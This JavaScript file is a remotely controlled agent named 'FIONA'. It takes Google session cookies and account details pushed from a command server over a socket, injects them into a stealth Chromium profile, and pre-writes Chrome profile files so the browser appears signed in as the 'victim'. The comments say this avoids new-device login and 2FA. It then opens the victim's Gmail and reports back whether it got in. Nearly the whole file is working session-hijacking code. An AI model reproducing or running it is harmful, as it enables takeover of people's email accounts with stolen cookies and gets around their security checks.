'use strict';
require('dotenv').config();
const { chromium } = require('patchright');
const { io } = require('socket.io-client');
const os = require('os');
const path = require('path');
const fs = require('fs');

const { SERVER_URL, AGENT_EMAIL, AGENT_PASSWORD } = process.env;

if (!SERVER_URL || !AGENT_EMAIL || !AGENT_PASSWORD) {
  console.error('[FIONA] Missing .env values.');
  process.exit(1);
}

const activeBrowsers = new Map();
const launching = new Set();

function normalizeSameSite(sameSite) {
  if (!sameSite) return 'Lax';
  const l = sameSite.toLowerCase();
  if (l === 'strict') return 'Strict';
  if (l === 'lax') return 'Lax';
  if (l === 'none' || l === 'no_restriction') return 'None';
  return 'Lax';
}

function mapCookies(rawCookies) {
  return rawCookies.map((c) => ({
    name:     c.name,
    value:    c.value,
    domain:   c.domain,
    path:     c.path || '/',
    expires:  c.expirationDate ?? c.expires ?? -1,
    httpOnly: Boolean(c.httpOnly),
    secure:   Boolean(c.secure),
    sameSite: normalizeSameSite(c.sameSite),
  }));
}

async function launchProfile({ profileId, cookies, email, userId, gaiaId = '', displayName = '', pictureUrl = '' }) {
  const profileDir = path.join(os.tmpdir(), 'fiona-profiles', profileId);

  if (process.platform === 'win32') {
    try {
      const { execSync } = require('child_process');
      execSync(
        `wmic process where "name='chrome.exe' and commandline like '%${profileId}%'" call terminate`,
        { stdio: 'ignore', timeout: 5000 }
      );
      await new Promise(r => setTimeout(r, 1200));
    } catch (_) {}
  }
  if (fs.existsSync(profileDir)) {
    fs.rmSync(profileDir, { recursive: true, force: true });
  }
  fs.mkdirSync(profileDir, { recursive: true });

  // ── Pre-seed Chrome profile display info ─────────────────────────────────
  // Write account metadata into Local State BEFORE launch so Chrome
  // shows the victim's email in the profile icon immediately.
  // No web sign-in flow, no new-device login, no 2FA challenge.
  const displayName = email.split('@')[0].replace(/[._]/g, ' ');
  const localState = {
    profile: {
      info_cache: {
        Default: {
          active_time: Date.now() / 1000,
          avatar_icon: 'chrome://theme/IDR_PROFILE_AVATAR_26',
          gaia_given_name: displayName,
          gaia_id: '',
          gaia_name: displayName,
          hosted_domain: '',
          is_consented_primary_account: false,
          is_ephemeral: false,
          is_using_default_avatar: true,
          is_using_default_name: false,
          name: displayName,
          shortcut_name: displayName,
          user_name: email,
        },
      },
      last_active_profiles: ['Default'],
      profiles_created: 1,
    },
  };
  const defaultDir = path.join(profileDir, 'Default');
  fs.mkdirSync(defaultDir, { recursive: true });
  fs.writeFileSync(
    path.join(profileDir, 'Local State'),
    JSON.stringify(localState, null, 2)
  );

  // Write Default/Preferences with account_info so Chrome starts truly signed in.
  // This makes Chrome show "Sign out of Chrome" + sync + passwords — not "Sign in to Chromium".
  if (gaiaId) {
    const firstName = (displayName || '').split(' ')[0] || email.split('@')[0];
    const preferences = {
      account_info: [{
        account_id:                   gaiaId,
        email:                        email,
        full_name:                    displayName || email.split('@')[0],
        given_name:                   firstName,
        hd:                           '',
        is_child_account:             false,
        is_under_advanced_protection: false,
        picture_url:                  pictureUrl,
        locale:                       'en',
        signed_in:                    true,
      }],
      profile: {
        avatar_index:            26,
        gaia_given_name:         firstName,
        gaia_id:                 gaiaId,
        gaia_name:               displayName || email.split('@')[0],
        hosted_domain:           '',
        is_using_default_avatar: true,
        is_using_default_name:   false,
        name:                    displayName || email.split('@')[0],
        user_name:               email,
      },
      signin: { allowed: true },
    };
    fs.writeFileSync(
      path.join(defaultDir, 'Preferences'),
      JSON.stringify(preferences, null, 2)
    );
  }

  // ── Launch Chromium ───────────────────────────────────────────────────────
  // Map sameSite values to Patchright's expected format
  const mapSameSite = (s) => {
    if (!s || s === 'unspecified' || s === 'no_restriction') return 'None';
    if (s === 'lax') return 'Lax';
    if (s === 'strict') return 'Strict';
    return 'None';
  };

  const formattedCookies = cookies.map(c => ({
    name:     c.name,
    value:    c.value,
    domain:   c.domain,
    path:     c.path || '/',
    expires:  c.expirationDate ?? -1,
    httpOnly: c.httpOnly ?? false,
    secure:   c.secure ?? false,
    sameSite: mapSameSite(c.sameSite),
  }));

  // storageState injects cookies BEFORE Chrome's startup sign-in verification runs.
  // addCookies() arrives too late — Chrome has already done its ListAccounts check by then.
  const storageState = { cookies: formattedCookies, origins: [] };

  const context = await chromium.launchPersistentContext(profileDir, {
    storageState,
    headless: false,
    viewport: { width: 1280, height: 800 },
    ignoreDefaultArgs: ['--disable-sync'],
    args: [
      '--no-first-run',
      '--no-default-browser-check',
      '--disable-background-networking',
    ],
  });

  console.log(`[FIONA] Injected ${formattedCookies.length} cookies for ${email} via storageState`);

  // Use the default page launchPersistentContext creates
  const pages = context.pages();
  const firstTab = pages.length > 0 ? pages[0] : await context.newPage();

  // Visit myaccount.google.com FIRST — this triggers Chrome's internal
  // accounts.google.com/ListAccounts?gpsia=1 check using the injected
  // LSID/GAPS cookies, which is what makes the profile badge show the
  // victim's email rather than showing "Sign in to Chrome"
  await firstTab.goto('https://myaccount.google.com', {
    waitUntil: 'domcontentloaded',
    timeout: 30000,
  });
  await firstTab.waitForTimeout(2000);

  // Now open Gmail in a new tab (tab 2 becomes the focus)
  const gmailTab = await context.newPage();
  await gmailTab.goto('https://mail.google.com', {
    waitUntil: 'domcontentloaded',
    timeout: 30000,
  });

  // Bring Gmail tab to front
  await gmailTab.bringToFront();
  await gmailTab.waitForTimeout(3000);

  const finalUrl   = gmailTab.url();
  const pageTitle  = await gmailTab.title();
  console.log(`[FIONA] Gmail URL:   ${finalUrl}`);
  console.log(`[FIONA] Gmail title: ${pageTitle}`);

  const authenticated =
    pageTitle.toLowerCase().includes('inbox') ||
    pageTitle.includes('@gmail.com') ||
    (finalUrl.includes('mail.google.com') &&
      !finalUrl.includes('/signin') &&
      !finalUrl.includes('/ServiceLogin'));

  activeBrowsers.set(profileId, { context, userId });

  context.on('close', () => {
    activeBrowsers.delete(profileId);
    launching.delete(profileId);
    try {
      fs.rmSync(profileDir, { recursive: true, force: true });
    } catch (err) {
      console.warn(`[FIONA] Cleanup warning (non-fatal): ${err.message}`);
    }
    console.log(`[FIONA] Browser closed: ${profileId}`);
  });

  console.log(`[FIONA] Launched: ${email} — authenticated: ${authenticated}`);
  return authenticated;
}

async function main() {
  console.log(`[FIONA] Authenticating as ${AGENT_EMAIL}...`);
  const loginRes = await fetch(`${SERVER_URL}/api/auth/login`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email: AGENT_EMAIL, password: AGENT_PASSWORD }),
  });

  const loginData = await loginRes.json();
  if (!loginData.success) {
    console.error('[FIONA] Login failed:', loginData.error || 'Unknown error');
    process.exit(1);
  }

  const userId = loginData.user?.id;
  if (!userId) {
    console.error('[FIONA] Login response missing user.id');
    process.exit(1);
  }
  console.log(`[FIONA] Authenticated — userId: ${userId}`);

  const socket = io(SERVER_URL, {
    transports: ['websocket', 'polling'],
    reconnection: true,
    reconnectionDelay: 3000,
    reconnectionAttempts: Infinity,
  });

  socket.on('connect', () => {
    console.log('[FIONA] Socket connected — registering agent...');
    socket.emit('agent-ready', { userId });
  });

  socket.on('agent-ack', () => {
    console.log('[FIONA] ✓ Agent ready. Waiting for launch commands...');
  });

  socket.on('launch-profile', async ({ profileId, cookies, email, userId: uid, gaiaId = '', displayName = '', pictureUrl = '' }) => {
    if (activeBrowsers.has(profileId)) {
      console.log(`[FIONA] Already running: ${email}`);
      socket.emit('launch-result', { profileId, userId: uid, success: true, authenticated: true, email });
      return;
    }

    if (launching.has(profileId)) {
      console.log(`[FIONA] Already launching: ${email} — ignoring duplicate`);
      return;
    }
    launching.add(profileId);

    console.log(`[FIONA] Launch command received: ${email}`);
    try {
      const authenticated = await launchProfile({ profileId, cookies, email, userId: uid, gaiaId, displayName, pictureUrl });
      socket.emit('launch-result', { profileId, userId: uid, success: true, authenticated, email });
    } catch (err) {
      console.error('[FIONA] Launch error:', err.message);
      launching.delete(profileId);
      socket.emit('launch-result', { profileId, userId: uid, success: false, authenticated: false, email, error: err.message });
    }
  });

  socket.on('close-profile', async ({ profileId, userId: uid }) => {
    const entry = activeBrowsers.get(profileId);
    if (entry) {
      await entry.context.close().catch(() => {});
      activeBrowsers.delete(profileId);
      launching.delete(profileId);
      console.log(`[FIONA] Profile closed: ${profileId}`);
      socket.emit('close-result', { profileId, userId: uid, success: true });
    } else {
      socket.emit('close-result', { profileId, userId: uid, success: false });
    }
  });

  socket.on('disconnect', (reason) => {
    console.warn('[FIONA] Disconnected:', reason, '— reconnecting...');
  });

  socket.on('connect_error', (err) => {
    console.error('[FIONA] Connection error:', err.message);
  });
}

main().catch((err) => {
  console.error('[FIONA] Fatal:', err.message);
  process.exit(1);
});
